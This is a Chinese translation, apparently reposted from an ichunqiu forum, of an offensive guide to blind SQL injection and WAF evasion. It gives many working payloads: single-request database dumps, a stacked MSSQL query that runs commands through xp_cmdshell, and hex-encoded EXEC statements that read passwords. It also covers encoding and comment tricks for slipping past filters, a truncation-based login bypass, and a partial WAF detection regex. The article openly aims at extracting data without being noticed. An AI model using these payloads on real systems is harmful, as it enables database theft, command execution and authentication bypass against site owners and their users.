作者：[Arizona](https://bbs.ichunqiu.com/thread-43169-1-1.html?from=beef)

原文来自：[https://bbs.ichunqiu.com/thread-43169-1-1.html](https://bbs.ichunqiu.com/thread-43169-1-1.html?from=beef)

## 0x00 ~ 介绍

SQL注入毫无疑问是最危险的Web漏洞之一，因为我们将所有信息都存储在数据库中。其解决方案之一，有许多公司实施Web应用程序防火墙和入侵检测/预防系统来试图保护自己。但不幸的是，这些对策往往是不充分的，并且很容易被绕过。

尽管不能依赖防火墙来防止所有SQL注入，但一些防火墙在作为监视工具时也会很有效。由于目标存在防火墙，在攻击过程中会检测到攻击者并阻止攻击。因此，经过优化和绕过的SQL注入具有更高的成功率;它将更快地提取数据并且不会被很快的检测到。

在本文中，我们将讨论和比较各种优化方法，这些方法在利用SQL盲注时非常有效。我们还将介绍SQL查询，这些查询可用于仅使用一个请求转储整个数据库，这使得在不被注意的情况下非常容易的快速检索数据。此外，我们将检查几种绕过技术，这些技术可能使防火墙无法识别SQL攻击。将这些技术结合起来会造成致命的攻击，而且这可能是毁灭性的。

## 0x01 ~ 优化

在进行SQL盲注时，优化通常是最容易被忽视的重要方面之一。优化的SQL注入不仅可以产生更快的结果，还可以减少网络拥塞并且更低服务器上的负担反过来提供较低的被检测风险。与传统方法相比，某些方法提供的速度差异令人惊讶，并且可以将成功从数据库中提取数据所需的请求量和时间减少三分之一以上。为了使用这些方法，我们必须先了解它们是如何工作的以及每种方法的有效性，但在我们开始分析和比较它们之前，重要的是事先审查一些初步概念。

计算机只能理解数字，因此创建了ASCII（美国信息交换标准码）。
ASCII代码是字母或字符的数字表示。任何ASCII字符都可以用1字节或8位表示，也称为八位字节。在处理SQL注入时，我们通常对完整的ASCII范围不感兴趣，因为并非所有字符在数据库中都是有效的或允许的。出于这个原因，我们只关注ASCII范围32
-126，它给我们留下了一组94个字符。该范围只能用7位表示，最高有效位为0.这在进一步优化技术时会派上用场，因为它允许我们削减请求。下表以不同的形式显示了ASCII范围：

  
![image.png](https://image.3001.net/images/20180724/15324171265951.png!small)  

注意：MSB（最高有效位）始终关闭，允许我们保存其他请求。

### 方法分析

当禁用错误显示时，这些方法旨在与盲SQL注入一起使用，我们通常必须一次检索1个字符。

### 二分法

二分法通常称为计算机科学中的二分搜索算法，是一种对数算法，也是最广泛使用的通过SQL注入提取数据的方法;它是多功能的，有效的并直接实施，使其成为黑客和程序员的热门选择。使用有限列表，二分法通过将列表分成两半并搜索分支的每一半来工作。它继续这个过程，通过拆分半分支找到项目并重复直到完成，这就是为什么它是一个二分法分而治之的算法。当在性能方面进行描述时，它具有与log2（N）相同的最坏情况和平均情况，这使得该方法通常处于其请求的高端。应用于SQL注入时，需要其他请求才能使此方法有效。

### 正则表达式方法

Simone Quatrini和Marco
Rondini在一篇名为“具有正则表达式攻击的sql盲注”的论文中首次介绍，这种方法只是二分法的一种变体，它使用正则表达式。对于MySQL，该技术使用REGEXP函数和MSSQL，LIKE语句具有类似的功能，但工作方式略有不同。这种方法的一个小缺点是对每种类型的数据库使用两种不同的函数。建议的替代方案是使用存在于MySQL和MSSQL中的BETWEEN函数;这将通过能够为多个数据库使用单个函数来简化实现。

REGEXP'^ [a-z]'真<br>  
REGEXP'^ [a-n]'真<br>  
REGEXP'^ [a-g]'错误<br>  
REGEXP'^ [h-n]'真<br>  
REGEXP'^ [h-l]'错误<br>

注意表2：正在使用的REGEX方法的示例。

### 按位方法

有几种按位方法彼此之间略有不同。在分析这些方法时，在大多数情况下它们都比二分法更糟糕，因此本文不会详细描述它们。这些方法使用按位运算，例如移位或AND运算，但这些往往是多余的，因为二进制在MySQL和MSSQL中都被视为一个字符串，因此可以使用SUBSTRING函数或类似函数来比较每个单独的位到请求数量是一致的

> | 二进制"a" | 要转移的位 | 二进制结果 | 十进制结果 |<br>  
> | 01100001 | >7 | 00000000 | 0 |<br>  
> | 01100001 | >6 | 00000001 | 1 |<br>  
> | 01100001 | >4 | 00000110 | 6 |<br>  
> | 01100001 | >3 | 00001100 | 12 |<br>  
> | 01100001 | >2 | 00011000 | 24 |<br>  
> | 01100001 | >1 | 00110000 | 48 |<br>  
> | 01100001 | >0 | 01100001 | 97 |<br>

注意：按位移位方法显示检索字符“a”。

### Bin2Pos方法

这种方法是我自己的发明，它本质上是一种优化的搜索技术，它可以检索至少只有1个请求和最多6个请求的字符。此方法依赖于有限的字符列表，其中每个字符都映射到列表中的位置;将字符映射到它们的位置很重要，因为与字符的十进制值相比，它提供了较小的数字。然后将位置转换为二进制并从二进制序列中第一次出现的on位开始检索。通过将位置转换为二进制，我们有效地将字符集减少到两个（1或0）。另外，因为我们从第一次出现on位开始，所以我们可以保存一个请求我们知道这将是一个“1”。

由于二进制文件的大小取决于列表中字符的位置，因此字符越接近列表的开头，检索它所需的请求量就越少。出于这个原因，我们可以通过字母表中最常用的字母对列表进行排序，以进一步优化它。在MySQL中使用带有两个不同值的参数（例如id
= 1，id = 2）的实现示例可以在下图中使用十六进制集看到：

引用：<br>

> IF((@a:=MID(BIN(POSITION(MID((SELECT password FROM users WHERE id=2 LIMIT  
>
> 1),1,1)IN(CHAR(48,49,50,51,52,53,54,55,56,57,65,66,67,68,69,70))),1,1))!=space(  
> 0),2-@a,0/0)

因为标准集大小为94（32 - 126）最多使用7位，这意味着要检索的字符的最大大小将为7.需要额外的请求来确定我们已到达二进制序列的末尾。
因此，通过避免第一个请求并且必须在最后执行额外请求，这总共留下了7个请求。
但是，由于我们知道7位是可以检索的最大长度，如果我们已经发出6个请求，我们不必发送额外的请求来知道我们何时到达结束，因为我们已经达到了最大长度可能。
这给出了仅有6个请求的最坏情况。 最好的情况是在列表的第一个位置找到字符时只需要1个请求。 下图演示了使用按字母顺序排序的集合的此方法。

  
![image.png](https://image.3001.net/images/20180724/15324171406860.png!small)  

### 优化查询

现在我们已经概述了一些通过盲注提取数据的已知方法，我们将看一些优化的查询，这些查询可以大大加快从数据库中提取数据的速度。 Ionut
Maroiu演示了一种MySQL技术，它允许使用单个请求检索所有数据库，表和列。 PostgreSQL和Oracle也有类似的技术，由Dmitriy
Serebryannikov演示，另一个由Daniel Kachakil发现的MSSQL演示。 下表显示了每个描述的查询的示例：

  
![image.png](https://image.3001.net/images/20180724/15324171487377.png!small)  

注意：使用单个请求检索多个表和列条目的不同查询。

还有更具破坏性的单一请求攻击是可能的，因为在使用PDO或PHP的新的和“改进的”扩展mysqli时，MSSQL甚至MySQL中的堆栈查询都是可能的。
例如，以下MSSQL查询将检查是否已加载xp_cmdshell，如果已启用，则会检查它是否处于活动状态，如果它处于活动状态，则会继续运行您选择的命令。

PHP Code:

    
    
    <?php 
    ' IF EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME='TMP_DB') DROP TABLE TMP_DB DECLARE home.php?mod=space&uid=48563 varchar(8000) IF EXISTS(SELECT * FROM dbo.sysobjects WHERE id = object_id (N'[dbo].[xp_cmdshell]') AND OBJECTPROPERTY (id, N'I**tendedProc') = 1) BEGIN CREATE TABLE %23xp_cmdshell (name nvarchar(11), min int, max int, config_value int, run_value int) INSERT %23xp_cmdshell EXEC master..sp_configure 'xp_cmdshell' IF EXISTS (SELECT * FROM %23xp_cmdshell WHERE config_value=1)BEGIN CREATE TABLE %23Data (dir varchar(8000)) INSERT %23Data EXEC master..xp_cmdshell 'dir' SELECT @a='' SELECT @a=Replace(@a%2B'<br></font><font
    color="black">'%2Bdir,'<dir>','</font><font color="orange">') FROM %23Data WHERE dir>@a DROP TABLE %23Data END ELSE SELECT @a='xp_cmdshell not enabled' DROP TABLE %23xp_cmdshell END ELSE SELECT @a='xp_cmdshell not found' SELECT @a AS tbl INTO TMP_DB-- 

对于[渗透测试](http://bbs.ichunqiu.com/portal.php)人员和攻击者，测试SQL注入可能会变得乏味。
一些Web应用程序可以具有无限数量的具有无限数量参数的模块。 此外，每种可能的SQL注入类型至少需要三次单独的测试：单引号，双引号和无引号。
通过优化查询，可以将所有查询减少到一个请求。

  
![image.png](https://image.3001.net/images/20180724/15324171563268.png!small)  

注意：优化注入允许我们通过单个请求测试所有三种变化。

另一个使用AND的例子：

  
![image.png](https://image.3001.net/images/20180724/1532417163142.png!small)  

注意：使用AND逻辑的优化注入的变体。

为了进一步说明这个优化的查询，请考虑以下注入：

引用：<br>  
SELECT * FROM Users WHERE username=”Admin” and password = “1 OR
1#"OR"'OR''='"="'OR''='”

引用：<br>  
SELECT * FROM Articles WHERE id = 1!=0--+"!="'!='

## 0x03 ~ 绕过

混淆是绕过防火墙的主要方法之一。通过欺骗防火墙将我们的攻击视为合法流量，我们可以成功交付有效载荷而不会被检测到。有几种方法可以用来混淆我们的注入。通过使用fuzzers，我们可以发现可用于混淆的不同可能性。虽然有时简单性可能是更好的选择，如果所有其他方法都失败了，我们总是可以采用各种编码方式。

### Fuzzers

防火墙开发人员必须充分了解所有数据库规范和奇怪之处。其中一些奇怪的是有记录的，其他的只能通过模糊测试找到。发现了一个特殊的例子通过使用fuzzers，每种类型的数据库都允许使用空白字符。每个不同的RDBMS允许各种不同的空白字符，而不是通常的0x20。通过使用其他允许的空格字符切换标准空格，我们可以使某些防火墙无法识别注入，从而使我们能够有效地绕过它们。

  
![image.png](https://image.3001.net/images/20180724/15324171711815.png!small)  

注意：不同RDBMS中允许的有效空格。

替换空格可能是一个有用的技巧，但任何复杂的防火墙都能够检测到大多数允许的空格，并随后将适当地处理它们。
当防火墙真正擅长去混淆注射时，有时最好采取相反的路线并尽可能简化注射。

就像许多编程语言为我们提供了几种不同的方法来实现相同的结果一样，SQL也是如此。 在某些情况下，使用最简单的方法可能是最有效的;
如果我们的SQL注入看起来像普通英语，防火墙很难区分普通文本和SQL语法。 一个很好的例子是CASE语句的以下用法，它可以在WHERE语句之后附加：

    
    
    CASE WHEN BINARY TRUE THEN TRUE END IS NOT UNKNOWN HAVING TRUE FOR UPDATE

### 编码

特殊编码是绕过防火墙时使用的另一个工具。大多数这些编码将取决于应用程序如何处理数据。
Web应用程序可以以一种方式查看数据，而代理，防火墙或数据库可能以不同方式解释数据。正是由于层之间的这些差异，编码可能会绕过防火墙。

### URL编码

浏览网页的任何人之前都看过这种编码。 URL编码用于转换“特殊”字符，因此可以通过HTTP发送它们。字符转换为十六进制等效，前缀为百分号。

### 双URL编码

这只是对字符应用URL编码两次的过程。所需要的只是重新编码百分号。如果数据在通过防火墙之后和到达数据库之前被解码两次，则此编码成功。

### Unicode编码

Unicode是一种行业标准，用于表示多种语言的110,000多个符号和字符。它可以用不同的字符编码表示，如UTF-8，UTF-16，UTF-32等。此编码通常适用于IIS服务器或使用ASP或.NET构建的应用程序

  
![image.png](https://image.3001.net/images/20180724/15324171781786.png!small)  

注意：下表显示了字符“a”的每个编码。

### UTF-8编码

UTF-8是对Unicode字符集中的1,114,112个代码点（0到10FFFF）中的每一个进行编码的一种形式。
“UTF”代表Unicode转换格式，而“8”代表它使用8位块代表字符。
表示字符所需的块数从1到4不等。只需要1个字节或块来表示ASCII范围0-127中的字符，前导位为0.但是，任何高于127的代码点都需要
以多字节序列表示，其中第一个字节的前导位，直到第一个字节，表示完成序列的后续字节总数。 第一个字节中第一个0之后的后续位构成字符的一部分。
每个连续字节在高位位置具有“10”，但是这两个位是冗余的。 下图中的xx表示实际的数据位。

  
![image.png](https://image.3001.net/images/20180724/15324171862278.png!small)  

注意：以下是不同UTF-8多字节编码的表示。

因为不需要第一个字节之后的前两个高位，应用程序可能只读取最后六位，允许我们用00,01或11替换前两个最高有效位。

注意：字符“a”的几种不同的UTF-8表示。

### 半字节编码

半字节是4位，因此存在十六（2 ** 4）个可能值，因此半字节对应于单个十六进制数字。
由于ASCII范围0-255中的每个字符都可以用1个字节表示，因此我们可以对最多4个进行URL编码有效位，4个最低有效位或两者。 这通常被称为First
Nibble，Second Nibble和Double Nibble编码。

  
![image.png](https://image.3001.net/images/20180724/15324171932117.png!small)  

注意：第一，第二和双半字节编码的示例。

无效的百分比编码

无效的百分比编码特定于.NET / IIS应用程序。 通过在无效十六进制的字符之间添加百分号，IIS将剥离使数据有效的字符。
但是，任何不知道此行为的防火墙都会留下百分号，这反过来会破坏SQL语法，使其无法被防火墙检测到。

防火墙的数据是什么样的：

    
    
    %UNI%ON %SE%LE%CT 1 %FR%OM %D%U%A%L

IIS的数据是什么样的：

    
    
    UNION SELECT 1 FROM DUAL

### 十六进制编码无效

无效的十六进制不完全是一种编码，而是一种滥用某些应用程序如何处理十六进制到十进制的转换的方式。
这个想法是创建无效的十六进制，导致与有效十六进制相同的十进制值。根据应用程序处理和转换数据的方式，它可能会将％2Ú视为与％61相同。

  
![image.png](https://image.3001.net/images/20180724/15324172026624.png!small)  

表13：转换无效十六进制结果时转换的结果与有效十六进制相同。

  
![image.png](https://image.3001.net/images/20180724/15324172088579.png!small)  

表14：无效的十六进制使用完整的字母表，其中有效的十六进制仅使用A-F。

## 0x04~高级绕过

### 常见的SQL过滤器类型

在[sql注入攻击](http://www.ichunqiu.com/courses/277)的上下文中，您可能遇到的最有趣的过滤器是那些试图阻止包含以下一个或多个的输入的过滤器：

> SQL关键字，例如SELECT，AND，INSERT<br>  
> 特定的单个字符，例如引号或连字符<br>  
> 空格

您可能还会遇到过滤器而不是阻止包含前面列表中的项目的输入，尝试修改输入以使其安全，通过编码或转义有问题的字符或从输入中剥离违规项目并处理剩下的内容
顺便说一句，顺便说一句，这是不合逻辑的，因为如果有人想要损害你的Web应用程序，你想要处理他的恶意输入。

通常，这些过滤器保护的应用程序代码容易受到SQL注入（因为全世界都存在无能，无知或收入不高的开发人员），并利用您需要的漏洞来找到一种避免过滤器传递恶意输入的方法
易受攻击的代码。 在接下来的几节中，我们将研究一些可以用来做的技术。

### 绕过SQL注入过滤器

请注意，上述所有SQL注入过滤器绕过技术均基于黑名单过滤心态，而不是白名单过滤逻辑。这意味着糟糕的软件开发基于黑名单过滤器概念。

通过SQL注入过滤器的方法很多，还有更多方法可以利用它们。回避SQL注入过滤器的最常见方法是：

> 使用大小写变化。<br>  
> 使用SQL注释。<br>  
> 使用URL编码。<br>  
> 使用动态查询执行。<br>  
> 使用空字节。<br>  
> 嵌套剥离表达式。<br>  
> 利用截断。<br>  
> 使用非标准入口点。<br>  
> 结合上述所有技术。

### 大小写变化

如果关键字阻塞过滤器特别天真，您可以通过改变攻击字符串中字符的大小来规避它，因为数据库以不区分大小写的方式处理SQL关键字。 例如，如果阻止以下输入：

> 'UNION SELECT @@ version --
您可以使用以下替代方法绕过过滤器：

> 'UnIoN sElEcT @@ version --
注意：仅使用大写或仅使用小写也可以使用，但我不建议在这种类型的模糊测试中花费大量时间。

### SQL 注释

您可以使用内联注释序列来创建SQL的片段，这些片段在语法上不常见但完全有效，并绕过各种输入过滤器。 您可以通过这种方式规避各种简单的模式匹配过滤器。

当然，您可以使用相同的技术来绕过过滤器，这些过滤器只会阻止任何空白区域。
许多开发人员错误地认为，通过将输入限制为单个令牌，他们正在阻止SQL注入攻击，忘记了内联注释使攻击者能够构造任意复杂的SQL而不使用任何空格。

对于MySQL，您甚至可以在SQL关键字中使用内联注释，从而可以绕过许多常见的关键字阻止过滤器。
例如，如果后端数据库是MySQL，如果只检查SQL注入字符串的空格，则以下攻击仍然有效：

> UNION//SELECT//@@version//-- Or ' U//NI//ON//SELECT//@@version//--
注意：这种类型的滤波器旁路方法包括间隙填充和黑名单坏字符序列过滤。

### URL编码

URL编码是一种多功能技术，可用于击败多种输入过滤器。 在最基本的形式中，这涉及用十六进制形式的ASCII代码替换有问题的字符，前面是％字符。
例如，单引号的ASCII代码为0x27，因此其URL编码表示为％27。在这种情况下，您可以使用以下攻击来绕过过滤器。

原始查询：

> NION SELECT @@version --
URL编码的查询：

>
> %27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%40%40%76%65%72%73%69%6f%6e%20%2d%2d

在其他情况下，这种基本的URL编码攻击不起作用，但您可以通过对被阻止的字符进行双URL编码来绕过过滤器。
在双重编码攻击中，原始攻击中的％字符本身以正常方式进行URL编码（如％25），因此单引号的双URL编码形式为％2527。
如果您修改前面的攻击以使用双URL编码，它看起来像这样：

> %25%32%37%25%32%30%25%35%35%25%34%65%25%34%39%25%34%66%25%34%65%25  
> %32%30%25%35%33%25%34%35%25%34%63%25%34%35%25%34%33%25%35%34%25%32  
> %30%25%34%30%25%34%30%25%37%36%25%36%35%25%37%32%25%37%33%25%36%39  
> %25%36%66%25%36%65%25%32%30%25%32%64%25%32%64

注意：您还应该考虑选择性URL编码也是绕过SQL注入过滤的有效方法。

双URL编码有时会起作用，因为Web应用程序有时会多次解码用户输入，并在最终解码步骤之前应用其输入过滤器。 在前面的示例中，涉及的步骤如下：<br>

> 攻击者提供输入'％252f％252a / UNION ...<br>  
> 应用程序URL将输入解码为'％2f％2a / UNION ...<br>  
> 应用程序验证输入不包含/ *（它不包含）。<br>  
> 应用程序URL将输入解码为'/ ** / UNION ...<br>  
> 应用程序在SQL查询中处理输入，并且攻击成功。<br>

URL编码技术的另一个变体是使用阻塞字符的Unicode编码。
除了使用带有两位十六进制ASCII码的％字符外，URL编码还可以使用各种Unicode字符表示形式。 unicode编码时的SQL注入查询如下所示：

> 27 20 55 4E 49 4F 4E 20 53 45 4C 45 43 54 20 40 40 76 65 72 73 69 6F 6E 20
> 2D 2D

注意：我没有使用unicode编码进行大量实验，坦率地说，我不认为使用Unicode编码的fuzzing SQL会非常有用。

### CAST和CONVERT关键字

编码攻击的另一个子类是CAST和CONVERT攻击。
CAST和CONVERT关键字显式地将一种数据类型的表达式转换为另一种数据类型，通过CAST关键字将其嵌入到MySQL，MSSQL和Postgre数据库中。
它已被许多网站中的各种类型的恶意软件攻击使用，并且是一个非常有趣的SQL注入过滤器旁路。 使用此类攻击的最臭名昭着的僵尸网络是ASPRox僵尸网络病毒。
看看语法：

> 使用 CAST<br>  
> CAST ( expression AS data_type )<br>  
> 使用 CONVERT<br>  
> CONVERT ( data_type [ ( length ) ] , expression [ , style ] )<br>

使用CAST和CONVERT，您可以通过使用函数SUBSTRING传递结果进行类似的过滤，一个示例可以向您显示我的意思。 以下SQL查询将返回相同的结果：

> SELECT SUBSTRING('CAST and CONVERT', 1, 4)

返回结果：CAST

> SELECT CAST('CAST and CONVERT' AS char(4))

返回结果：CAST

> SELECT CONVERT(varchar,'CAST',1)

返回结果：CAST

注意：请注意，SUBSTRING和CAST关键字的行为相同，也可用于盲SQL注入攻击。 您可以尝试使用此链接来测试此查询。
如果你想看到它，你必须在这个板上注册。）。

进一步扩展CONVERT和CAST，我们可以确定以下SQL查询是否有效且非常有趣，请参阅如何使用CAST和CONVERT提取MSSQL数据库版本。

0x1 - 标识要执行的查询：

> SELECT @@VERSION

0x2 - 根据关键字CAST和CONVERT构造查询：

> SELECT CAST('SELECT @@VERSION' AS VARCHAR(16))

或者

> SELECT CONVERT(VARCHAR,'SELECT @@VERSION',1)

0x3 - 使用关键字EXEC执行查询：

> SET @sqlcommand = SELECT CONVERT(VARCHAR,'SELECT @@VERSION',1)  
> EXEC(@sqlcommand)

或者首先将SELECT @@ VERSION转换为Hex

> SET @sqlcommand = (SELECT CAST(0x53454C45435420404076657273696F6E00 AS
> VARCHAR(34))  
> EXEC(@sqlcommand)

注意：了解CAST和CONVERT的创意。现在，由于句子CAST中包含的数据类型是十六进制的，因此执行varchar转换。

您还可以使用嵌套的CAST和CONVERT查询来注入恶意输入。这样，您就可以开始在不同的编码类型之间进行交换，并创建更复杂的查询。这应该是一个很好的例子：

> CAST(CAST(PAYLOAD IN HEX, VARCHAR(CHARACTER LENGTH OF PAYLOAD)),,
> VARCHAR(CHARACTER LENGTH OF TOTAL PAYLOAD)

动态查询执行

许多数据库允许通过将包含SQL查询的字符串传递到执行查询的数据库函数来动态执行SQL查询。
如果您发现了一个有效的SQL注入点，但发现应用程序的输入过滤器阻止了您想要注入的查询，那么您可以使用动态执行来绕过过滤器。
动态查询执行在不同的数据库上有不同的

在Microsoft SQL Server上，您可以使用EXEC函数以字符串形式执行查询。 例如：

> 'EXEC xp_cmdshell ‘dir’; — Or 'UNION EXEC xp_cmdshell ‘dir’; —

注意：使用EXEC功能，您可以枚举后端数据库中所有已启用的存储过程，并将已分配的权限映射到存储过程。

在Oracle中，您可以使用EXECUTE IMMEDIATE命令以字符串形式执行查询。例如：

> DECLARE pw VARCHAR2(1000);<br>  
> BEGIN<br>  
> EXECUTE IMMEDIATE 'SELECT password FROM tblUsers' INTO pw;<br>  
> DBMS_OUTPUT.PUT_LINE(pw);<br>  
> END;<br>

注意：您可以逐行或全部一起执行该操作，当然，通过传递方法的其他过滤器可以与此结合使用。

上述SQL注入攻击类型可以提交到Web应用程序攻击入口点，无论是上面呈现的方式，还是后端数据库接受批量查询（例如MSSQL）时由分号分隔的一批命令。

例如在MSSQL中你可以这样做：

> SET @MSSQLVERSION = SELECT @@VERSION; EXEC (@MSSQLVERSION); --
注意：可以从不同的Web应用程序入口点或相同的查询提交相同的查询。

数据库提供了各种操作字符串的方法，使用动态执行来打败输入过滤器的关键是使用字符串操作函数将过滤器允许的输入转换为包含所需查询的字符串。
在最简单的情况下，您可以使用字符串连接从较小的部分构造字符串。 不同的数据库使用不同的语法进行字符串连接。

例如，如果阻止SQL关键字SELECT，则可以按如下方式构造它。

Oracle:

> 'SEL'||'ECT'

MS-SQL:

> 'SEL'+'ECT'

MySQL:

> 'SEL' 'ECT'

此SQL混淆方法的其他示例如下：

Oracle:

> UN’||’ION SEL'||'ECT NU’||’LL FR’||’OM DU’||’AL--
MS-SQL:

> ' un’+’ion (se’+’lect @@version) --
MySQL:

> ' SE’’LECT user(); #

请注意，SQL Server使用+字符进行连接，而MySQL使用空格。
如果要在HTTP请求中提交这些字符，则需要将它们分别对其进行URL编码为％2b和％20。
更进一步，您可以使用CHAR函数（Oracle中的CHR）使用其ASCII字符代码构造单个字符。 例如，要在SQL
Server上构造SELECT关键字，您可以使用：

> CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)

注意：名为Hackbar的Firefox插件工具也会自动执行此操作（很长一段时间以来）

您可以使用这种方式构造字符串，而无需使用任何引号字符。
如果您有一个SQL注入入口点，其中引号被阻止，您可以使用CHAR函数将字符串（例如“admin”）放入您的漏洞。 其他字符串操作函数也可能是有用的。
例如，Oracle包含函数REVERSE，TRANSLATE，REPLACE和SUBSTR。 在SQL
Server平台上构造用于动态执行的字符串的另一种方法是从单个十六进制数字实例化一个字符串，该数字表示字符串的ASCII字符代码。 例如，字符串：

> SELECT password FROM tblUsers

可以构造和动态执行如下：

> DECLARE @query VARCHAR(100)<br>  
> SELECT @query =
> 0x53454c4543542070617373776f72642046524f4d2074626c5573657273<br>  
> EXEC(@query)<br>

注意：2008年初开始的针对Web应用程序的大规模SQL注入攻击采用了这种技术，以减少被攻击的应用程序中的输入过滤器阻止其漏洞利用代码的可能性。

### 空字节

通常，为了利用SQL注入漏洞而需要绕过的输入过滤器是在应用程序自己的代码之外，[入侵检测系统](http://www.ichunqiu.com/course/298?bbs)（IDS）或WAF中实现的。出于性能原因，这些组件通常使用本机代码语言编写，例如C
++。在这种情况下，您通常可以使用空字节攻击来规避输入过滤器并将您的漏洞利用到后端应用程序中。

由于在本机代码和托管代码中处理空字节的不同方式，空字节攻击起作用。在本机代码中，字符串的长度由字符串开头的第一个空字节的位置确定 -空字节有效地终止字符串。另一方面，在托管代码中，字符串对象包含字符数组（可能包含空字节）和字符串长度的单独记录。这种差异意味着当本机过滤器处理您的输入时，它可能在遇到空字节时停止处理输入，因为这表示就过滤器而言字符串的结尾。如果空字节之前的输入是良性的，则过滤器不会阻止输入。

但是，当应用程序处理相同的输入时，在托管代码上下文中，将处理空字节后面的完整输入，从而允许执行您的漏洞利用。要执行空字节攻击，您只需在过滤器阻塞的任何字符之前提供URL编码的空字节（看起来像这样）。在原始示例中，您可以使用攻击字符串绕过本机输入过滤器，如下所示：

> ' UNION SELECT password FROM tblUsers WHERE username='admin'--
注意：当访问用作银行结束数据库时，NULL字节可用作SQL查询分隔符。

嵌套剥离表达式

某些清理过滤器会从用户输入中删除某些字符或表达式，然后以常规方式处理剩余数据。
如果正在被剥离的表达式包含两个或多个字符，并且未以递归方式应用过滤器，则通常可以通过将禁止的表达式嵌套在其自身内来使过滤器失败。

例如，如果从输入中删除SQL关键字SELECT，则可以使用以下输入来阻止过滤器：

> SELSELECTECT

注意：请参阅绕过愚蠢过滤器的简单性。

### 截断

清理过滤器通常对用户提供的数据执行多个操作，有时其中一个步骤是将输入截断为最大长度，可能是为了防止缓冲区溢出攻击，或者在具有预定义最大长度的数据库字段中容纳数据
。考虑一个登录函数，它执行以下SQL查询，包含两项用户提供的输入：

> SELECT uid FROM tblUsers WHERE username = 'jlo' AND password = 'r1Mj06'

假设应用程序使用清理过滤器，它执行以下步骤：

将引号加倍，用两个单引号（“）替换单引号（'）的每个实例<br>  
将每个项目截断为16个字符。 如果您提供典型的SQL注入攻击向量，例如：

> admin'--
将执行以下查询，您的攻击将失败：

> SELECT uid FROM tblUsers WHERE username = 'admin''--' AND password = ''

双引号表示您的输入无法终止用户名字符串，因此查询实际上会检查具有您提供的文字用户名的用户。
但是，如果您提供包含15个和一个引号的用户名aaaaaaaaaaaaaa'，则应用程序首先将引号加倍，生成17个字符的字符串，然后通过截断为16个字符来删除其他引号。
这使您可以将未转义的引号走私到查询中，从而干扰其语法：

> SELECT uid FROM tblUsers WHERE username = 'aaaaaaaaaaaaaaa'' AND password =
> ''

注意：此初始攻击会导致错误，因为您实际上有一个未终止的字符串。

a后面的每对引号代表一个转义引号，并且没有最终引号来分隔用户名字符串。
但是，因为您有第二个插入点，所以在密码字段中，您可以通过提供以下密码来恢复查询的语法有效性并绕过登录：

> or 1=1--
这会导致应用程序执行以下查询：

> SELECT uid FROM tblUsers WHERE username = 'aaaaaaaaaaaaaaa'' AND password =
> 'or 1=1--'

当数据库执行此查询时，它会检查文字用户名为的表条目：

> aaaaaaaaaaaaaaa' AND password =

这可能总是假的，或者1 = 1，这总是正确的。 因此，查询将返回表中每个用户的UID，通常会导致应用程序将您作为表中的第一个用户登录。
要以特定用户身份登录（例如，使用UID 0），您将提供以下密码：

> or uid=0--
注意：此查询被认为是用于身份验证绕过或权限提升的非常古老的技术。

## 0x05 ~ 更高级的

基于Regexp的WAF:

>
> (?:)\swhen\s\d+\sthen)|(?:"\s(?:#|--|{))|(?:\/*!\s?\d+)|(?:ch(?:a)?r\s(\s\d)|(?:(?:(n?and|x?or|not)\s+||||\&\&)\s\w+()  
>
> (?:[\s()]case\s()|(?:)\slike\s()|(?:having\s[^\s]+\s[^\w\s])|(?:if\s?([\d\w]\s[=<>~])  
>
> (?:"\sor\s"?\d)|(?:\x(?:23|27|3d))|(?:^.?"$)|(?:(?:^["\\](?:[\d"]+|[^"]+"))+\s(?:n?and|x?or|not||||\&\&)\s[\w"[+&!@(),.-])|(?:[^\w\s]\w+\s[|-]  
>
> \s"\s\w)|(?:@\w+\s+(and|or)\s["\d]+)|(?:@[\w-]+\s(and|or)\s[^\w\s])|(?:[^\w\s:]\s\d\W+[^\w\s]\s".)|(?:\Winformation_schema|table_name\W)  
>
> (?:"\s*.+(?:or|id)\W"\d)|(?:\^")|(?:^[\w\s"-]+(?<=and\s)(?<=or\s)(?<=xor\s)(?<=nand\s)(?<=not\s)(?<=||)(?<=\&\&)\w+()|(?:"[\s\d][^\w\s]+\W\d  
>
> \W.["\d])|(?:"\s[^\w\s?]+\s[^\w\s]+\s")|(?:"\s[^\w\s]+\s[\W\d].(?:#|--))|(?:".*\s\d)|(?:"\sor\s[^\d]+[\w-]+.\d)|(?:[()<>%+-][\w-]+[^\w\s]  
> +"[^,])  
>
> (?:\d"\s+"\s+\d)|(?:^admin\s"|(\/*)+"+\s?(?:--|#|\/*|{)?)|(?:"\sor[\w\s-]+\s[+<>=(),-]\s[\d"])|(?:"\s[^\w\s]?=\s")|(?:"\W[+=]+\W")|(?:"\s[!=|]  
>
> [\d\s!=+-]+.["(].$)|(?:"\s[!=|][\d\s!=]+.\d+$)|(?:"\slike\W+[\w"(])|(?:\sis\s0\W)|(?:where\s[\s\w.,-]+\s=)|(?:"[<>~]+")  
>
> (?:union\s(?:all|distinct|[(!@])?\s[([]\sselect)|(?:\w+\s+like\s+\")|(?:like\s"\%)|(?:"\slike\W["\d])|(?:"\s(?:n?and|x?or|not
> ||||\&\&)\s+[\s  
>
> \w]+=\s\w+\shaving)|(?:"\s*\s\w+\W+")|(?:"\s[^?\w\s=.,;)(]+\s[(@"]\s\w+\W+\w)|(?:select\s[[]()\s\w.,"-]+from)|(?:find_in_set\s()  
> (?:in\s(+\sselect)|(?:(?:n?and|x?or|not
> ||||\&\&)\s+[\s\w+]+(?:regexp\s(|sounds\s+like\s"|[=\d]+x))|("\s\d\s(?:--|#))|(?:"[%&<>^=]+\d\s(=|  
>
> or))|(?:"\W+[\w+-]+\s=\s\d\W+")|(?:"\sis\s\d.+"?\w)|(?:"|?[\w-]{3,}[^\w\s.,]+")|(?:"\sis\s[\d.]+\s\W.")  
>
> (?:[\d\W]\s+as\s["\w]+\sfrom)|(?:^[\W\d]+\s(?:union|select|create|rename|truncate|load|alter|delete|update|insert|desc)
> )|(?:(?:select|create|rename|  
>
> truncate|load|alter|delete|update|insert|desc)\s+(?:(?:group_)concat|char|load_f
> ile)\s?(?)|(?:end\s);)|("\s+regexp\W)|(?:[\s(]load_file\s()  
>
> (?:@.+=\s(\sselect)|(?:\d+\sor\s\d+\s[-+])|(?:\/\w+;?\s+(?:having|and|or|select)\W)|(?:\d\s+group\s+by.+()|(?:(?:;|#|--)\s(?:drop|alter))|(?:  
>
